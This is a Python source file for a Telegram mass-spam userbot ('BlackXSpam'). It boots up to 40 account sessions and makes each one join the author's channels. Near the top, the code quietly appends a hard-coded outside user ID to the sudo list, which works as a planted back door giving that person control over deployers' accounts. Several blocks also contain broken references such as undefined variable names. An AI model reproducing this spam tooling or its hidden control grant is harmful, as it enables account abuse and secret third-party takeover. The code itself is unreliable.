# @BlackXSpam | @MAMBA_X_SUPPORT

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

blackversion = "v2.0.5"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_NAME = config("ALIVE_NAME", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
ALIVE_TEXT = config("ALIVE_TEXT", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5290064852 not in SUDO_USERS:
    SUDO_USERS.append(5290064852)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def BlackX():
    global Bla
    global Bla2
    global Bla3
    global Bla5
    global Bla4
    global Bla6
    global Bla7
    global Bla8
    global Bla9
    global Bla10
    global Bla11
    global Bla12
    global Bla13
    global Bla14
    global Bla15
    global Bla16
    global Bla17
    global Bla18
    global Bla19
    global Bla20
    global Bla21
    global Bla22
    global Bla23
    global Bla25
    global Bla24
    global Bla26
    global Bla27
    global Bla28
    global Bla29
    global Bla30
    global Bla31
    global Bla32
    global Bla33
    global Bla34
    global Bla35
    global Bla36
    global Bla37
    global Bla38
    global Bla39
    global Bla40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        Bla = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await Bla.start()
            botme = await Bla.get_me()
            await Bla(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Bla = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "blackxspam"
        Bla = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        Bla2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await Bla2.start()
            await Bla2(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla2(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "blackxspam"
        Bla2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        Bla3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await Bla3.start()
            await Bla3(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla3(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "blackxspam"
        Bla3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        Bla4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await Bla4.start()
            await Bla4(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla4(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "blackxspam"
        Bla4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        Bla5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await Bla5.start()
            await Bla5(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla5(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "blackxspam"
        Bla5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        Bla6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await Bla6.start()
            await Bla6(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla6(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "blackxspam"
        Bla6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        Bla7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await Bla7.start()
            await Bla7(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla7(functions.channels.JoinChannelRequest(channel="@MAMBA_x_SUPPORT"))
            botme = await Bla7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "blackxspam"
        Bla7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        Bla8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await Bla8.start()
            await Bla8(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla8(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "blackxspam"
        Bla8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        Bla9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await Bla9.start()
            await Bla9(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla9(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "blackxspam"
        Bla9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        Bla10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await Bla10.start()
            await Bla10(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await bla10(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "blackxspam"
        Bla10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        Bla11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await Bla11.start()
            await Bla11(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla11(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = "blackxspam"
        Bla11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        Bla12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await Bla12.start()
            await Bla12(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla12(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "blackxspam"
        Bla12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        Bla13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await Bla13.start()
            await Bla13(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla13(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "blackxspam"
        Bla13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        Bla14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await Bla14.start()
            await Bla14(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla14(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "blackxspam"
        Bla14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        Bla15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await Bla15.start()
            await Bla15(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla15(functions.channels.JoinChannelRequest(channel="@MAMBA_x_SUPPORT"))
            botme = await Bla15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "blackxspam"
        Bla15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        Bla16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await Bla16.start()
            botme = await Bla16.get_me()
            await Bla16(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla16(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "blackxspam"
        Bla16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        Bla17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await Bla17.start()
            botme = await Bla17.get_me()
            await Bla17(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla17(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "blackxspam"
        Bla17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        Bla18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Bla18.start()
            botme = await Bla18.get_me()
            await Bla18(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla18(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "blackxspam"
        Bla18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        Bla19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await Bla19.start()
            botme = await Bla19.get_me()
            await Bla19(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla19(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "blackxspam"
        Bla19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        Bla20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await Bla20.start()
            botme = await Bla20.get_me()
            await Bla20(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla20(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "blackxspam"
        Bla20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        Bla21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await Bla21.start()
            botme = await Bla21.get_me()
            await Bla21(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla21(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = "blacxspam"
        Bla21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        Bla22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Bla22.start()
            await Bla22(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla22(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = "blacxspam"
        Bla22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        Bla23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await  Bla23.start()
            await Bla23(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla23(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = "blacxspam"
        Bla23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        Bla24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await Bla24.start()
            await Bla24(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla24(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await bLA24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = "blacxspam"
        Bla24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        Bla25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Bla25.start()
            await Bla25(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla25(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = "blacxspam"
        Bla25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 36 Found")
        Bla26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await Bla26.start()
            await Bla26(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla26(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = "blackxspam"
        Bla26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        Bla27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await Bla27.start()
            await Bla27(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla27(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = "blackxspam"
        Bla27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        Bla28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Bla28.start()
            await Bla28(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla28(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = "blackxspam"
        Bla28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla28.start()
        except Exception as e:
            pass   
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        Bla29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await Bla29.start()
            await Bla29(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla29(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = "blackxspam"
        Blag29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla29.start()
        except Exception as e:
            pass   
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        Bla30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await Bla30.start()
            await Bla30(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla30(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = "blackxspam"
        bla30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla30.start()
        except Exception as e:
            pass 
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        Bla31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await Bla31.start()
            await Bla31(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla31(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla31.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        pass
        session_name = "blackxspam"
        Bla31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        Bla32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Bla32.start()
            await Bla32(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla32(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            botme = await Bla32.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 not Found")
        pass
        session_name = "blackxspam"
        Bla32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla32.start()
        except Exception as e:
            pass   
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        Bla33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await Bla33.start()
            await Bla33(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla33(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla33.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 not Found")
        pass
        session_name = "blackxspam"
        Bla33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla33.start()
        except Exception as e:
            pass 
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        Bla34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await Bla34.start()
            await Bla34(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla34(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla34.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 not Found")
        pass
        session_name = "blackxspam"
        Bla34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        Bla35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Bla35.start()
            await Bla35(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla35(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Bla35.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 not Found")
        pass
        session_name = "blackxspam"
        Bla35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        Bla36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await Bla36.start()
            botme = await Bla36.get_me()
            await Bla36(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mig36(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = "blackxspam"
        Bla36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla36.start()
        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        Bla37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await Bla37.start()
            botme = await Bla37.get_me()
            await Bla37(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla37(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = "blackxspam"
        Bla37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        Bla38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await Bla38.start()
            botme = await Bla38.get_me()
            await Bla38(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla38(functions.channels.JoinChannelRequest(channel="@MAMAB_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = "blackxspam"
        Bla38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        print("String 39 Found")
        Bla39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await Bla39.start()
            botme = await Bla39.get_me()
            await Bla39(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla39(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
